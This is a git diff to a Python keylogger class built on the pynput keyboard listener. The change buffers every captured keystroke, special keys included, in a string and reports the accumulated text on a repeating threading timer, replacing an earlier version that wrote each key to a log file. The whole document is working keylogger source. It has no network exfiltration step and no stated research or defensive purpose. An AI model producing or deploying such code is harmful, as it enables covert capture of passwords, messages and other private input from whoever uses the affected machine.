@@ -1,3 +1,4 @@
+from typing import Text
 from src.model.persistance.directory_manager import *
 from src.model.persistance.file_manager import *
 from src.model.util.constants import *
@@ -5,22 +6,43 @@ from src.model.util.logger import *
 
 from pynput import keyboard
 
+import threading
+
 class Keylogger:
     
-    def __init__(self) -> None:
+    def __init__(self, secs) -> None:
         self.directory_manager = DirectoryManager()
         self.file_manager = FileManager()
         self.logger = Logger(Constants.PATH_LOG, Constants.FILE_NAME_LOG)
 
-    def on_key_pressed(self, key) -> bool:
-        key = str(key).replace("'", "")
-        self.file_manager.write_file(Constants.PATH_LOG, Constants.FILE_NAME_LOG, self.logger.create_log_message(Constants.LOG_MESSAGE_KEY_PRESSED + key))
-        return True
+        self.text = ""
+        self.secs = secs
+
+    def append(self, text) -> str:
+        self.text += text
+        return self.text
+
+    def clear(self) -> str:
+        self.text = ""
+        return self.text
+
+    def on_key_pressed(self, key) -> None:
+        try:
+            current_key = str(key.char)
+        except:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append(current_key)
    
-    def write_log(self):
-        pass
+    def report(self):
+        print(self.text)
+        timer = threading.Timer(self.secs, self.report)
+        timer.start()
 
     def start(self):
         with keyboard.Listener(
             on_press=self.on_key_pressed) as listener:
+            self.report()
             listener.join()
